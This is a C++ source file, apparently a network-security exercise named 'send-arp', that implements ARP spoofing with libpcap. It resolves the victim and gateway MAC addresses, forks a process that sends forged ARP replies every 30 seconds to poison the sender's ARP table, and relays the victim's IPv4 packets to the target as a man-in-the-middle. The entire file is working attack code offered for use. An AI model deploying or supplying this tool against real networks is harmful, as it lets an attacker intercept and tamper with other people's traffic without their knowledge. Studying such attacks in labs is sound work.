#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/types.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "arp-spoof.h"
#include "ipv4hdr.h"

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc %2  != 0 ) {
		usage();
		return -1;
	}

	Mac attackerMac, senderMac, targetMac;
	Ip attackerIp, senderIp, targetIp;

	string interface = argv[1];

	cout << "Getting Attacker Info...\n" ;
	getAttackerInfo(interface, attackerMac, attackerIp);
	cout << "Attacker MAC Address: " << string(attackerMac) << "\n";
	cout << "Attacker IP Address: " << string(attackerIp) << "\n";
	cout << "\n=============================================\n\n";
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	for(int i=1; i< argc/2 ; i++) {
		senderIp = Ip(argv[i*2]);
		cout <<"Setting Sender IP to: " << argv[i*2] << "\n";
		targetIp = Ip(argv[i*2 +1]);
		cout << "Setting Target IP to: " << argv[i*2+1] << "\n";
		cout << "\nGetting Sender MAC Address...\n";
		getMACAddress(handle, senderMac, senderIp, attackerMac, attackerIp);
		cout << "Sender MAC Address: " << string(senderMac) << "\n";
		cout << "\nGetting Target MAC Address...\n";
		getMACAddress(handle, targetMac, targetIp, attackerMac, attackerIp);
		cout << "Target MAC Address: " << string(targetMac) << "\n";

		// Target continuously sends arp reply to sender (approx. per 90 seconds)
		// Create Child Process to Continuously Infect ARP Table of Sender
		pid_t pid = fork();
		if (pid <0) {
			cout << "Fork Failed!\n";
			return -1;
		}
		else if (pid == 0) {
			while(true) { 
				cout << "Infecting Sender's ARP Table\n";
				sendARPPacket(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
				sleep(30); //30 secs will be enough, since target sends arp reply every 90 seconds
			}
		}
		else {
			while (true) {
				//Parent Process Continuously listens for Sender's packets
				struct pcap_pkthdr* header;
				const u_char* packet;
				int res = pcap_next_ex(handle, &header, &packet);
				if (res == 0 || packet== NULL ) continue;
				if (res == -1 || res == -2) {
					cout << "PCAP ERROR!\n";
					break;
				}

				EthHdr* ethHdr = (EthHdr*)packet;
				
				// Only check packets from sender
				if (ethHdr->smac_ != senderMac) {
					continue;
				}
				
				// If an ARP Request form sender looking for target is recieved
				// Infect Sender's ARP Table again
				if (ethHdr->type() == EthHdr::Arp) {
					ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
					if (arpHdr->op() == ArpHdr::Request && arpHdr -> tip() == targetIp) {
						cout << "Recieved ARP Request. Infecting Sender's ARP Table...\n";
						sendARPPacket(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
					}
				} 

				// If an IP Packet from sender to target is recieved
				// Relay the packet to target
				else if (ethHdr->type() == EthHdr::Ip4 ) {
					struct IPv4Hdr* ipHdr = (struct IPv4Hdr*)(packet + sizeof(EthHdr));

					if (ntohl(ipHdr->ip_src) == senderIp ) {
						cout << "Relaying Packet to Target...\n";
						ethHdr -> smac_ = attackerMac;
						ethHdr -> dmac_ = targetMac;
						
						// Send Packet
						pcap_sendpacket(handle, packet, header->len);
					} 

				}
			}
		}
		//Todo: functional programming
		cout << "\n=============================================\n\n";

	}
	pcap_close(handle);
}
